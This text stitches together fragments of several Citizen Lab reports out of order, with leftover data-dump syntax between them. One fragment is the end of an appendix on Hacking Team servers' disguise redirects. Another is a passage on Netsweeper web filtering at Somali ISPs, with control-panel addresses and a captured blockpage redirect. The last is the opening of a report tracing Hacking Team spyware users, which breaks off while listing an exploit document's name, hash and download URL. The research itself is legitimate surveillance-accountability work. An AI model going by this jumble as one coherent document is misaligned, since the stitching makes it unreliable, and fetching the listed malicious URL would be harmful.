http://www.abcnews.com\n 7/25/2012\n\n\n 173.255.234.29\n http://www.abcnews.com\n 7/25/2012 – 12/15/2012\n\n\n\nWe cannot conclusively say what purpose the disguises serve. It is possible that the servers employed these specific disguises in order to appear benign to a target who noticed their computer communicating with one of these servers. For example, a target might discover one of these server IP addresses in their connection logs, and put the address into their web browser to investigate. Or a target might receive bait content containing spyware hosted at one of these IP addresses,11 and then put the IP into their browser to see if it appeared associated with the bait content.\nThe most interesting redirects seem to be http://www.davidlerner.com/default.aspx (David Lerner Associates; a New York-based financial firm), and http://www.mailtribune.com (Mail Tribune; a small local newspaper in Oregon).  We observed the redirect to David Lerner between 12/14/2012 and 5/2/2013.  David Lerner was sanctioned by self-regulatory agency FINRA on 22 October 2012.12  On 13 March 2013, Apple REIT revealed that its REITs Six, Seven, Eight, and Nine, were under SEC investigation, which the SEC refused to confirm or deny;13 David Lerner Associates was the sole underwriter and distributor for Apple REITs One through Ten.14  We emphasize that we do not know who the targets of the spyware were in any of these cases, and are including this information only for the purpose of spurring further investigation.\nIn the case of http://www.abcnews.com/, the redirect was highly unusual in that it used JavaScript rather than a META redirect as in the aforementioned cases.  We observed 173.230.142.200 return the following response:\n\n<!DOCTYPE HTML>\n<html>\n<head>\n<script type=”text/javascript”>\n<!–\nvar iprequest = windows.location.hostname;\nif( iprequest == “173.255.234.29”)\n{\nwindow.location = “http://www.abcnews.com”;\n}\nelse\n{\nwindow.location = “http://www.google.com”;\n}\n//–>\n</script>\n</head>\n<body>\n</body>\n</html>\n\n \nThe purpose of the script is to redirect a user who has typed the IP “173.255.234.29” into their web browser address bar to the website “http://www.abcnews.com”.  A user who has reached this page by typing in any other address will instead be redirected to “http://www.google.com”.  Note that there is a typo— “windows.location.hostname” should be “window.location.hostname”.  The typo causes the script to be inoperative—i.e., the user sees a blank webpage in their browser.  Interestingly, 173.255.234.29 returned a response identical to the above, except without the typo.  Thus, a user who typed 173.255.234.29 into their browser was indeed correctly redirected to http://www.abcnews.com.\nClick here for Appendix B: An interesting Rackspace-based server group.\n \nAcknowledgements\nThe authors would like to thank David Fidler, Indiana University for helpful feedback.\n \nFootnotes\n1 http://hackingteam.it/index.php/customer-policy.\n2 https://www.securelist.com/en/analysis/204792290/Spyware_HackingTeam.\n3  http://www.theverge.com/2013/9/13/4723610/meet-hacking-team-the-company-that-helps-police-hack-into-computers.\n4 http://slate.me/1eSTeUF.\n5 https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/.\n6 “http://www.wired.com/threatlevel/2013/06/spy-tool-sold-to-governments/.\n7 https://www.eiu.com/public/topical_report.aspx?campaignid=DemocracyIndex12.\n8 https://citizenlab.org/2014/02/mapping-hacking-teams-untraceable-spyware/.\n9 https://www.linode.com/tos.cfm .\n10 In all cases, the redirects were META redirects, or JavaScript redirects; both would only be evident in a web browser.\n11 e.g., in the Panama case mentioned in https://citizenlab.org/2014/02/mapping-hacking-teams-untraceable-spyware/.\n12 http://www.finra.org/Newsroom/NewsReleases/2012/P191729.\n13 http://www.richmondbizsense.com/2013/03/13/local-reits-funds-under-sec-scrutiny/.\n14 http://www.finra.org/web/groups/industry/@ip/@enf/@ad/documents/industry/p123739.\n\n\t\t\t\t\n\t\t\t",

We also discuss the implications of our findings in relation to human rights standards, corporate social responsibility, and international sanctions against Somalia. Internet access in Somalia is extremely limited. The country’s low penetration rate can be ascribed to political volatility and economic stagnation in the context of over two decades of near continuous conflict. Despite limited connectivity, Internet growth is still predicted to increase in the future, and several Internet Service Providers (ISPs) operate in the country.\nThis report is a continuation of Citizen Lab’s research investigating and analyzing Internet filtering and surveillance practices worldwide. It aims to inform public policy, advocacy work, and research in this field.\nPrior research on use of commercial filtering technologies in problem countries\nThe Citizen Lab has performed extensive research on the presence of commercial filtering technologies across the globe. In 2013, Citizen Lab researchers discovered the presence of devices manufactured by Blue Coat Systems on public networks in 83 countries, including Iran and Sudan.1 Blue Coat Systems is a California-based company that produces networking appliances capable of website filtering and deep packet inspection.2 As part of the OpenNet Initiative,3 the Citizen Lab identified filtering products developed by the Canada-based company Netsweeper operating on ISPs in several Middle Eastern countries, including Qatar, United Arab Emirates (UAE), Yemen, and Kuwait. 4 Two years later, the Citizen Lab found Netsweeper filtering products on Pakistani ISPs.5 The Citizen Lab has performed similar research on SmartFilter—an American-made filtering product—and documented its presence in Saudi Arabia and the UAE.6 The Citizen Lab also conducts research on FinFisher—a line of surveillance technology sold by the UK-based Gamma Group—and has documented the presence of FinFisher command-and-control servers in 36 countries across the world.7\nBackground about Somalia\nSomalia has undergone tremendous civil strife and instability since the overthrow of President Siad Barre in 1991. Rival warlords and insurgent groups have competed for power since that time. Famine beset Somalia in 1992 and from 2010-2012. Since 2006, Somalia has faced a growing insurgency by Islamist groups such as the Islamic Courts Union (ICU) and al-Shabaab, an al-Qaeda-affiliated organization that branched out from the ICU. Piracy off the shores of Somalia has become a significant regional threat, with the costs of pirate attacks on international maritime trade in 2011 estimated to be between USD 6.6 to 6.9 billion.8\nAfter the fall of the Barre regime, centralized political control effectively collapsed and a number of regions claimed autonomy from Somalia. Somaliland, Somalia’s northernmost region bordering Djibouti and Ethiopia, declared itself a sovereign state in 1991. While the international community has yet to officially recognize its political autonomy, Somaliland has in effect been an independently governed state for over two decades. Mogadishu serves as the capital of the internationally recognized government of Somalia, the Federal Government of Somalia, which is comprised of an executive branch and parliament. Other regions in Somalia include Puntland, which declared autonomy in 1998 but still exists within the framework of the Somali federal system.\nInternet in Somalia\nInternet access in Somalia is limited. According to an estimate by the International Telecommunications Union (ITU), Somalia’s Internet penetration rate was 1.38 percent in 2012, ranking Somalia among the countries with the lowest Internet penetration in the world.9 As of 2005, Balancing Act reported that 22 established ISPs existed in the country.10\nThe lack of a central government has permitted a wide range of businesses to operate in the country, free from taxes or service obligations that might otherwise impede growth.11 However, the fragile political and security situation in Somalia limits the activities of many of its ISPs. Somali ISPs Somtel and Telesom, for example, operate in Somaliland.12 Due to widespread piracy off Somalia’s coastlines, most Somalis must rely on satellite rather than undersea cables to connect to the Internet globally.13 Fear of piracy has deterred cable-laying ships from operating in Somalia’s waters, thereby impeding both the development and maintenance of undersea cables.14 The East African Marine Cable (TEAMS), for example, has been diverted an extra 200 kilometres from Somalia’s coastline.15 The largest Mogadishu-based telecommunications companies—Nationlink, Hormuud, and Olympic—have stationed their equipment centers in Mogadishu’s Bakara market, an area that has long been the site of violent struggle between the government and al-Shabaab insurgents. In 2011, Hormuud’s headquarters was repeatedly hit by artillery during conflict between al-Shabaab fighters and government forces, destroying equipment and killing staff.16\nAt-home connectivity is expensive and remains unaffordable for most Somalis. Estimates in 2012 indicated that service costs for home Internet range from USD 30-600 per month depending on speed and level of service.17 A report by the Somali Telecommunications Association (STA) in 2006 indicated that Somalia had 234 cyber cafes growing at a rate of more than 15 per cent every year.18 Service in Internet cafes is often slow, with speeds rarely exceeding 100 kb/s.19\nDespite these challenges, there are indications that Somalia’s Internet infrastructure will improve in the near future. In 2013, satellite provider O3b Networks Ltd. signed a deal with Somtel to provide connectivity through fiber optic cables as well as satellites.20 Liquid Telecom, a Mauritius-based telecommunications provider, announced in November 2013 that it will also partner with Hormuud to build Somalia’s first terrestrial fibre-optic cable to be built across the border with Kenya.21\nConversely, Somalia has a robust cellular infrastructure. Several factors, including the regulatory void exploited by the telecom companies, the competing armed factions and tribal groups’ heavy reliance on telecommunications infrastructure to operate their enterprises, and the telecommunications-dependent informal banking system, Hawala, used primarily by the Somali diaspora in Europe and North America to send remittances, have contributed to the thriving cellular communications market. Somalia also has an efficient mobile banking system known as ZAAD, that enables users to transfer funds, make purchase, and pay bills.22\nIn August 2012, media stories reported that Djibouti is able to restrict Internet communication in Somaliland, as the company which provides upstream Internet and telecommunications services to Telesom and Somtel is headquartered in Djibouti. A report from Somali news website Suna Times reported that the government of Djibouti ordered Telesom to block websites.23 Citizen Lab is not able to verify whether these websites have indeed been blocked. However, technical investigation shows that as Telesom’s sole transit provider, Djibouti Telecom (AS30990) would be able to exert this leverage to influence blocking in Telesom (AS37473)’s network.\nLegal and regulatory frameworks\nSomalia’s weak central government and continuous state of instability has hindered the development of strong legal frameworks. The Fund for Peace has ranked Somalia number one on its failed state index consistently from 2008 to 2013.24 While an internationally recognized federal government has existed since 2012, tensions between the central government and the self-declared independent state of Somaliland continue to exist.25 The government’s control of the country often does not extend beyond Mogadishu, and continuous poverty, widespread corruption, and a constant state of insecurity due to conflict with Islamist insurgents and other factions contribute to the state’s failure to effectively govern Somalia.26 The actual implementation of laws, regulations, and other statutes are therefore severely constrained in such a politically, economically, and socially fragile environment.\nSomalia adopted a new constitution in August 2012 during a meeting of its National Constituent Assembly. Articles 16 and 18 of Somalia’s Provisional Constitution call for Freedom of Association and Freedom of Expression and Opinions, respectively. Article 18 specifically states that “Freedom of expression includes freedom of speech, and freedom of the media, including all forms of electronic and web-based media.” Despite these guarantees, Reporters Without Borders reported that 18 members of the media were killed in 2012, and there have been at least two examples of government action against protesters in the past year.27\nTelecommunications and media in Somalia are governed by the Somali Media Law of 2007, which guarantees “freedom of expression and ideas” and specifically outlaws censorship, stating that “The media cannot be censored and cannot be compelled to publicize information complementary neither to the government nor to the opposition.”28 However, Article 12 of the Media Law states that media outlets should “avoid broadcasting and disseminating materials jeopardizing the Islamic religion and the Somali traditional ethics, unity of Somali people and sovereignty the [sic] Somali republic,” including information judged to be “false,” “contrary to the religious confession and the Islamic doctrine,” or “pornographic.” Article 16 mandates against disseminating “fictitious information and denouncement contrary to the dignity of the Somali citizen, person, organization, business entity, or the state.”\nUnder the Somali Media Law, the government must appoint a National Media Council (NMC) comprised of 10 members from private media and five from public media. The NMC has regulatory oversight of media outlets.\nSomaliland and Puntland are governed by separate laws due to their semi-autonomous status. Media in Somaliland is governed by the Press Law of 2004, though as of 2011 stakeholders from government and media had drafted and were attempting to pass a new Law on Media & Access to Information as well as a Broadcasting Law. None of Somalia’s communications laws guarantee access to information.\nAs of 2012, the Council of Ministers of the Transitional Federal Government had adopted the Communications Act of 2012, a draft law proposed by the Minister of Information, Posts, and Telecommunications.29 The draft law would create the National Communications Commission (NCC), a new and independent regulatory body with jurisdiction over broadcast media and telecommunications. The NCC would reportedly be transparent, accountable, and legally bound to respect the rights of citizens to freedom of expression.\nRadical groups’ threat to telecommunications companies in Somalia\nIn January 2014, the al-Qaeda-linked al-Shabaab group issued a directive prohibiting companies from providing Internet services, and gave them fifteen days to stop the mobile and fiber optic services.30 The group warned that those who do not comply will be considered as “working with the enemy” and will be dealt with according to Islamic law. Later that month, media reports said militants loyal to al-Shabaab began enforcing the ban in areas under their control, and that the militants were checking mobile phones for Internet connections.31 Reports also said that all telecommunications companies in al-Shabaab-controlled regions discontinued providing Internet services on cell phones.32 Citizens reported that telecommunications company Hormuud shut down its data service in areas under militant control.33 The mayor of Mogadishu, Mohamud Ahmed Nur Tarsan, said militant groups forced Hormuud to shut down Internet service by threatening to kill the company’s staff and senior officials in the areas controlled by al-Shabaab.34\nThe Minister of Interior and National Security of Somalia, Abdikarim Hussein Guled, condemned the al-Shabaab Internet ban, and called on the telecommunications companies to resist any coercion.35 He also said, “The Somali Government will work with all telecommunications companies and ensure that they are free to provide Internet and other related communications services to our citizens. While the government provides all the necessary assistance to protect the public, we also caution them not to cooperate and work with terrorist groups or bow to threats. We have a responsibility to protect our citizens against all threats.” The minister also said, “Our constitution guarantees freedom of expression and every citizen has the right to access information without fear.” 36 Despite al-Shabaab’s Internet ban, the organization has an active presence online. Their Twitter feed remained active until the social media site banned al-Shabaab’s presence after they tweeted their support for the Westgate Mall attack in Nairobi that killed 72 people.37 Their threat against Internet providers was posted on their Facebook page.38\nA January 2014 Gulf News article described the telecommunications operators in Somalia as pirates of airwaves, and said that they are responsible for “bedevilling successive governments” by means of tax avoidance, and preventing the current fragile government from cutting off communications to terror-linked militias.39 “By negotiating with foreign companies to charge above the usual rates and to put money collected into overseas funds, these “companies” avoid tax—and have sufficient clout to offer deals to favoured factions, or fund groups they believe will deliver a government suited to their economic or ideological aims,” the article said. The article also said the companies create wealth by “persuading other telcos worldwide to clip the ticket for them,” and that they became “wealthy enough to avoid attempts by government and the regulatory International Telecommunication Union (ITU) to rein them in.”\nInternet Filtering in Somalia\nNetsweeper Installation Identification Method\nCitizen Lab researchers used the computer search engine Shodan40 to scan Somali networks for evidence of installed Internet filtering devices.41 In November 2013, these Shodan searches found the commercial filtering technology Netsweeper active on three IP addresses on networks in Somalia and Somaliland. This finding was followed up with testing for Internet filtering using software developed by Citizen Lab, which tests the accessibility of a list of sensitive URLs. The test runs were conducted in December 2013.\nNetsweeper on Hormuud Telecom Somalia Inc\nScanning via search engine Shodan found a Netsweeper installation on the IP 41.78.72.114. Tests show that this device is active on the network of Hormuud Telecom Somalia Inc., as seen in Figure 1.\n\nFigure 1: Screenshot of Netsweeper installation on Hormuud Telcom Somalia Inc, at http://41.78.72.114/webadmin/start/\nHormuud Telecom Somalia is one of the major telecommunications providers in Somalia. According to its website, it enjoys over 60 percent of market share in both mobile and broadband services.42\nNetsweeper installation on Golis Telecom\nA Netsweeper installation was also found installed on the network of Golis Telecom, which describes itself as the largest telecommunications operator in northeastern Somalia, offering home and business Internet services.43\nA Netsweeper installation is active at http://113.208.81.52:8080/webadmin/start/. The index URL displays the logo of Golis Telecom Somalia, as seen in Figure 2 (http://113.208.81.52:8080/webadmin/deny/index.php).\n\nFigure 2: Screenshot of Netsweeper installation on Golis Telecom at http://113.208.81.52:8080/webadmin/deny/index.php\nThe IP address of this Netsweeper installation (113.208.81.52) points to host-113-208-81-052.absatellite.net, a host on the Asia Broadcast Satellite service, a company which provides VSAT services for telecommunications providers.44  The IP address range for Golis Telecom (41.223.110.0/24) is announced by ASN 45572, also on the Asia Broadcast Satellite service.\nNetsweeper on ISP Telesom\nNetsweeper is also installed on telecommunications company Telesom at control panel http://197.157.246.196:8080/webadmin/start/ [See Figure 3]\nTelesom is a telecommunications company headquartered in Hargeisa, the capital of Somaliland. It provides broadband Internet and mobile communication products.45 Accessing the ‘webadmin/deny’ URL seen below in Figure 3 displays a Golis Telecom logo. It is not clear why this page displays the logo of Golis instead of the Telesom logo, although Telesom lists both Golis Telecom and Hormuud as partners.46\n \n\nFigure 3: Screenshot of Netsweeper installation on Telesom Somaliland at http://197.157.246.196:8080/webadmin/deny/\nTest Results\nA short list of 49 URLs was tested in the country as a means of confirming the presence of Internet filtering and the use of Netsweeper technology to implement that filtering. Testing was conducted in December 2013 on Somalia’s networks through the use of a specially designed measurement client. This client accesses a pre-defined short list of 49 URLs on Somali networks while simultaneously triggering tests of the same URLs from a control location at the University of Toronto, which does not censor the type of content for which the client tested. The results of these tests are sent by the measurement client to servers at the University of Toronto for analysis.\nWe were not able to run full test runs from inside the country because of our security concerns over the threats by the al-Shabaab organization to Internet companies and users. Our concern for the security of potential in-country testers prevented us from extensive testing, so there may be websites and content categories beyond those identified here which are blocked. We have tested on one of the ISPs (Hormuud) identified above as potentially having an active Netsweeper device used to filter content. A full list of tested URLs can be found in the ‘Data’ section below.\nHormuud\nTwo tests of the 49 URL testing list were run in December 2013. In total, nine URLs were found to be blocked: seven pornography URLs and two URLs of circumvention/anonymizer tools. The following URLs were found to be blocked using the method described below:\n\n\n\nURL\nCategory\n\n\nhttp://fuck.com\nPornography\n\n\nhttp://hidemyass.com\nAnonymizers/Circumvention\n\n\nhttp://peacefire.org\nAnonymizers/Circumvention\n\n\nhttp://playboy.com\nPornography\n\n\nhttp://porn.com\nPornography\n\n\nhttp://sex.com\nPornography\n\n\nhttp://torproject.org\nAnonymizers/Circumvention\n\n\nhttp://www.proxy4free.com/list/webproxy1.html\nAnonymizers/Circumvention\n\n\nhttp://xhamster.com\nPornography\n\n\n\nThe method of blocking can be seen in the following example of an attempt to access the circumvention site http://peacefire.org: (Note: data referring to the IP address of the tester has been anonymized)\nGET / HTTP/1.1\nAccept-Encoding: identity\nHost: peacefire.org\nConnection: close\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1)\nHTTP/1.0 302 Moved\nContent-Length: 0\nLocation: http://41.78.72.114:8080/webadmin/deny/index.php?dpid=75&dpruleid=54&cat=32&ttl=-200&groupname=default&policyname=default&username=-&userip=41.78.X.X&connectionip=1.0.0.127&nsphostname=netsweeper2.hortel.net&protocol=nsef&dplanguage=-&url=http%3a%2f%2fpeacefire%2eorg%2f\nPragma: no-cache\nCache-Control: no-cache\nAs seen in this exchange, the user is redirected through HTTP code 302 to a blockpage. This redirection is injected into the GET request response, as the legitimate response from the server is also present in packet captures from the tests of URLs which are blocked. The HTML of this blockpage can be seen in this example of an attempt to access peacefire.org:\n<!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”>\n<html>\n<head>\n<title>Untitled document</title>\n</head>\n<body>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src=”http://peacefire.org/webadmin/deny/images/hormuud_block_page.JPG” alt=”” /></p>\n</body>\n</html>\nThe blockpage attempts to load the image ‘http://[tested URL]/webadmin/deny/images/hormuud_block_page.JPG’, where [tested URL] is the URL being tested, instead of opening it from a Hormuud hosted site. This will prevent the correct image from loading, and appears to be the result of a misconfiguration. However, the correct blockpage can be viewed by replacing [tested URL] with the IP address found via Shodan, as seen below in Figure 4.\n\nFigure 4: Blockpage on ISP Hormuud Telecom Somalia at http://41.78.72.114\nThe format of this blockpage URL is consistent with the use of Netsweeper devices.47 In addition, the original redirect explicitly refers to Netsweeper (‘netsweeper2.hortel.net’).\nMapping the ASNs of three telecommunication networks in Somalia shows that telecommunications companies Hormuud, Telesom, and SomCable are gateways to Internet connections from and to Somalia. Hence, the installation of Netsweeper filtering technology on Hormuud and Telesom is significant giving their strategic positions; these networks are not just local providers or resellers, but rather among the telecom providers that exert the leverage of shaping and controlling Internet traffic and information flow into and out of the entire country [Figure 5].\n\nFigure 5: Map of network connectivity of 3 ISPs in Somalia. Image courtesy Doug Madory at Renesys.\nDiscussion\nThe presence and use of commercial Internet filtering technologies in countries with poor records of human rights practices have always raised questions about the ethical practices of the providers of such technologies. The presence and use of Netsweeper in Somalia raise even more interesting questions and present a number of avenues for future research. At one time, the United Nations Security Council imposed sanctions against Ali Ahmed Nur Jim’ale, identified as controlling owner of Hormuud.48 Although that no longer is the case, the history of concern around telecommunications companies and radical insurgency in Somalia is, to say the least, complex and begs the following questions:\nHow and why did a Canadian-made filtering technology end up on the networks of these telecommunications companies in a country ranked as the most failed state on earth? Somalia’s weak central government, autonomous regions and ongoing insurgency mean that authority is contested amongst a number of actors. Did Netsweeper Inc. undertake due diligence before providing its filtering technology to the ISPs and telecom providers in Somalia? Has Netsweeper assessed if its products will be used in Somalia in ways that violate internationally recognized human rights norms and principles, and to prevent the receiving and imparting of information protected by Article 19 of the Universal Declaration of Human Rights? More importantly, are the telecommunications companies in Somalia using Netsweeper technology to implement filtering policies enforced by radical groups?\nIn this report, we were not able to document the full breadth and scope of what content is filtered on Hormuud and whether the Netsweeper installations present on Golis and Telesom are also being used to filter content. In addition, further research could examine what types of content are filtered beyond the pornography and circumvention tool websites identified here.\nIn our June 2013 report,49 which outlines the use of Netsweeper technology to engage in censorship of political and social content on the Pakistani ISP Pakistan Telecommunication Company Limited, we posed a number of questions to Netsweeper and committed to publishing their response in full. As of this report’s publication date, we have not received a response to these questions. The same set of questions are applicable in the case of Somalia.\n\nDoes Netsweeper have a human rights policy, and does it implement this policy when developing its technologies and sales strategy?\nDoes the company assess the human rights impact of its products during the design phase and has it ever discarded or altered designs given their inherent capability to undermine rights of freedom of expression and access to information?\nWhat resources does Netsweeper devote to human rights programs at the operational level? Does Netsweeper ask staff in relevant departments (e.g., legal, sales, engineering) to undergo human rights training?\nIs Netsweeper aware of the “know your customer” standard, where companies actively investigate whether potential clients may use technology to undermine human rights standards?

    "text": "\n\t\t\t\tDownload PDF I Read on ISSUU\nAuthors: Bill Marczak, Claudio Guarnieri, Morgan Marquis-Boire, and John Scott-Railton.\nThis post is the second in a series of posts that focus on the global proliferation and use of Hacking Team’s RCS spyware, which is sold exclusively to governments.\nRead the report’s coverage in Wired Italy [in Italian] as well as coverage in SC Magazine, and Der Spiegel.\nRead the first report in the series, “Hacking Team and the Targeting of Ethiopian Journalists.”\nRead the third report in the series, “Hacking Team’s US Nexus.”\n \nSummary\n\nRemote Control System (RCS) is sophisticated computer spyware marketed and sold exclusively to governments by Milan-based Hacking Team.1 Hacking Team was first thrust into the public spotlight in 2012 when RCS was used against award-winning Moroccan media outlet Mamfakinch,2 and United Arab Emirates (UAE) human rights activist Ahmed Mansoor.3 Most recently, Citizen Lab research found that RCS was used to target Ethiopian journalists in the Washington DC area.4\n\n\nIn this post, we map out covert networks of “proxy servers” used to launder data that RCS exfiltrates from infected computers, through third countries, to an “endpoint,” which we believe represents the spyware’s government operator. This process is designed to obscure the identity of the government conducting the spying. For example, data destined for an endpoint in Mexico appears to be routed through four different proxies, each in a different country. This so-called “collection infrastructure” appears to be provided by one or more commercial vendors—perhaps including Hacking Team itself.\n\n\nHacking Team advertises that their RCS spyware is “untraceable” to a specific government operator. However, we claim to identify a number of current or former government users of the spyware by pinpointing endpoints, and studying instances of RCS that we have observed. We suspect that agencies of these twenty-one governments are current or former users of RCS: Azerbaijan, Colombia, Egypt, Ethiopia, Hungary, Italy, Kazakhstan, Korea, Malaysia, Mexico, Morocco, Nigeria, Oman, Panama, Poland, Saudi Arabia, Sudan, Thailand, Turkey, UAE, and Uzbekistan. Nine of these countries receive the lowest ranking, “authoritarian,” in The Economist’s 2012 Democracy Index.5 Additionally, two current users (Egypt and Turkey) have brutally repressed recent protest movements.\n\n\nWe also study how governments infect a target with the RCS spyware. We find that this is often through the use of “exploits”—code that takes advantage of bugs in popular software. Exploits help to minimize user interaction and awareness when implanting RCS on a target device. We show evidence that a single commercial vendor may have supplied Hacking Team customers with exploits for at least the past two years, and consider this vendor’s relationship with French exploit provider VUPEN.\n\n \nIntroduction\nBackground: Hacking Team and Remote Control System (RCS)\nHacking Team, also known as HT S.r.l., is a Milan-based company that describes itself as the “first to propose an offensive solution for cyber investigations.”6 Their flagship Remote Control System (RCS)7 product, billed “the hacking suite for governmental interception,”8 is a suite of remote monitoring implants (i.e., spyware) sold exclusively to government agencies worldwide.\nScreen capture from Hacking Team promotional video.\nHacking Team distinguishes RCS from traditional surveillance solutions (e.g., wiretapping) by emphasizing that RCS can capture data that is stored on a target’s computer, even if the target never sends the information over the Internet.9 RCS also enables government surveillance of a target’s encrypted internet communications, even when the target is connected to a network that the government cannot wiretap. RCS’s capabilities include the ability to copy files from a computer’s hard disk, record skype calls, e-mails, instant messages, and passwords typed into a web browser.10 Furthermore, RCS can turn on a device’s webcam and microphone to spy on the target.11\nWhile Hacking Team claims to potential clients that RCS can be used for mass surveillance of “hundreds of thousands of targets,”12 public statements by Hacking Team emphasize RCS’s potential use as a targeted tool for fighting crime and terrorism.13\nHidden Collection Infrastructure and Target Exploitation\nConclusively linking spyware to a government user is difficult. Clearly, a government must consume the information it gathers from the spyware, but direct communication between an infected computer and a government server would be easily linkable to the government and thus undesirable. Hacking Team advertises that the RCS “collection infrastructure”—the mechanism by which data gathered by the spyware is transmitted to the government—renders the spyware “untraceable” to a specific government.\nOur research reveals that the RCS collection infrastructure uses a proxy-chaining technique which is roughly analogous to that used by general-purpose anonymity solutions like Tor in that multiple hops are used to anonymize the destination of information.14 Despite this technique, we are still able to map out many of these chains and their endpoints using a specialized analysis.\nBefore a government can receive data, it must first infect one or more target devices with the RCS spyware. Frequently, this takes the form of phishing attacks that convince a user to open a cleverly disguised executable file, or authorize installation of an application. However, the use of exploits, which take advantage of bugs in computer software, can be a more effective technique. Exploits typically require less user interaction before a successful infection (e.g., opening a Microsoft Word document or simply viewing a webpage is enough). Since 2012, we have been tracking exploits that we have seen used to install commercial backdoors. Our research examines connections between these exploits and discuss their origin.\nRoadmap\nIn this post, we begin by outlining our findings, first regarding the governments using Hacking Team’s RCS spyware, and then regarding the exploits used to install RCS. We then present the methodology for our findings, including our technique for mapping proxy chains and identifying endpoints. Finally, we conclude by putting our findings into the context of the global surveillance marketplace.\n \nSuspected Government Users of RCS\nAfter extensive analysis, we believe we have identified a set of governments that are current or former end users of Hacking Team’s RCS spyware. Our analysis is described in the section entitled “Identifying RCS Proxy Chains.”\nIntroduction\nIn response to a number of high-profile cases of repressive regimes apparently abusing Hacking Team’s RCS spyware, Hacking Team Senior Counsel Eric Rabe stated that the company does not provide its products to “repressive” regimes:\n\n“On the issue of repressive regimes, Hacking Team goes to great lengths to assure that our software is not sold to governments that are blacklisted by the EU, the US, NATO, and similar international organizations or any “repressive” regime.”15\n\nHacking Team has also stated that RCS is not sold through “independent agents,”16 and that all sales are reviewed by a board that includes outside engineers and lawyers. This board has veto power over any sale.17 Before authorizing a sale, the company states that it considers “credible government or non-government reports reflecting that a potential customer could use surveillance technologies to facilitate human rights abuses,” as well as “due process requirements” for surveillance.18\n21 Suspected Government Users of RCS\n\nWe suspect that twenty-one governments are using Hacking Team’s RCS spyware. Except as otherwise noted, we identified these countries based on tracing endpoints of Hacking Team proxy chains: Azerbaijan, Colombia, Egypt, Ethiopia,19 Hungary, Italy, Kazakhstan, Korea, Malaysia, Mexico, Morocco, Nigeria, Oman,20 Panama,21 Poland, Saudi Arabia, Sudan, Thailand, Turkey, United Arab Emirates,22 and Uzbekistan.\nCountries of Concern\nWhile many of these countries are known for their lack of freedom of expression, and politicization of the justice system, several routinely violate basic due process rights, and commit ongoing serious human rights violations. Viewing these countries through the lens of Hacking Team’s claimed sales practices, we highlight a few areas of concern:\n\nAzerbaijan: We identified an RCS endpoint in Azerbaijan (Azertelekom: 109.235.193.83) that was active between June and November 2013. Azerbaijan hit international headlines in 2013 when the results of the October presidential elections were accidentally released before voting began.23 In the run up to the elections, state media released a compromising video of influential Azerbaijani investigative reporter Khadija Ismayilova recorded from inside her home.24 While not used in Ismayilova’s case, RCS can enable the same type of monitoring by covertly activating a computer’s webcam, as well as stealing private videos and pictures from a computer.\n\n\nKazakhstan: We identified an RCS endpoint in Kazakhstan(JSC Kazakhtelecom Slyzhebnyi: 89.218.88.xxx). Human Rights Watch (HRW) reported numerous cases of Kazakh government critics facing arrest and detention in 2013. HRW reports that despite the government’s adoption of an anti-torture statute, “torture remains common in places of detention,” and “perpetrators of torture often go unpunished.”25\n\n\nUzbekistan: We found three RCS endpoints in Uzbekistan (Sarkor Telecom: 81.95.226.134, 81.95.224.10, and Sharq Telekom: 217.29.123.184). HRW’s 2013 report on Uzbekistan made mention of the government’s systematic use of torture with impunity, including beatings and rapes in detention. The report also mentioned lack of respect for due process, including the dissolution of the independent bar association, and forced disbarment of lawyers who take on controversial cases.26\n\n\nSaudi Arabia: We identified two RCS endpoints in Saudi Arabia (Etihad Etisalat: 37.242.13.10 and Al-Khomasia Shipping & Maintenance Co Ltd:27 62.149.88.20). HRW has reported “systematic violations of due process and fair trial rights” against detainees in Saudi Arabia, including the use of torture, denial of access to lawyers, inability for defendants to introduce evidence or confront their accusers at trial, and the lack of a penal code or precedent-driven jurisprudence.28\n\n\nSudan: We identified one RCS endpoint in Sudan (VisionValley: 41.78.109.91), in a range of eight addresses called “Mesbar” (an Arabic word meaning a device used to “probe”). HRW reported that Sudanese authorities used excessive violence against protesters resulting in numerous deaths. HRW also raised concern over a growing number of politically motivated arrests and detentions and noted authorities’ suspension of newspapers, and harassment of anti-government journalists.29\n\n \nTarget Exploitation\nHow do governments install Hacking Team’s RCS spyware on a target’s computer? This section briefly outlines one method: the use of exploits, which takes advantage of bugs in computer software.\nIntroduction\nThere are many actors that sell exploits to governments. A 2012 Citizen Lab report examined30 the possible connection between Hacking Team and VUPEN, a Montpellier-based company best known31 for the sale of “offensive IT intrusion solutions and government grade exploits.”32 While VUPEN offered oblique denials in response to Citizen Lab’s report, we have observed that very similar exploits continue to be used in the delivery of Hacking Team’s RCS spyware. Recently, it was was reported that VUPEN had sold exploits to the US National Security Agency (NSA).33\nGiven the usefulness of exploits in the deployment of spyware, it is unsurprising that Hacking Team competitor FinFisher GmbH also supplies exploits as part of their “Government IT Intrusion and Remote Monitoring” solution. In the company’s own words, “The FinFly Exploit Portal offers access to a large library of 0-Day and 1-Day Exploits for popular software like Microsoft Office, Internet Explorer, Adobe Acrobat Reader, and many more.”34 Hacking Team, FinFisher, and VUPEN promote their products in the same sessions at trade shows.35\nExploits\nHere we provide a brief analysis of seven related exploits, which we have selected as representative of a larger corpus of exploits. One can discover related exploits by creating signatures based on these seven exploits.\nThe exploits we examine here all present themselves as malicious documents. It is possible that the vulnerabilities, pre-weaponization, were discovered and/or sold by different actors. However the exploit documents bear enough similarity to suggest that they are produced using the same procedure or program. Six of these documents appear to facilitate the installation of Hacking Team’s RCS, while the other installs a remote access toolkit known as SpyNet. This suggests that there may be a common actor supplying the exploits independent of Hacking Team.\nExploit 1\nFilename: scandale.doc\nHash: dab3e4423525c798d7937441a3b356d7633a30f229911b9bedd38eeff74717d\nExploit: Adobe Flash in Word document\nTarget: Moroccan citizen journalist group, Mamfakinch.36 The message “Svp ne mentionnez pas mon nom ni rien du tout je ne veux pas d embrouilles…” was submitted to the Mamfakinch online news portal, along with a link to http://freeme.eu5.org/scandale%20(2).doc.\nPayload: The final payload was Hacking Team RCS.37 A more in-depth analysis of this 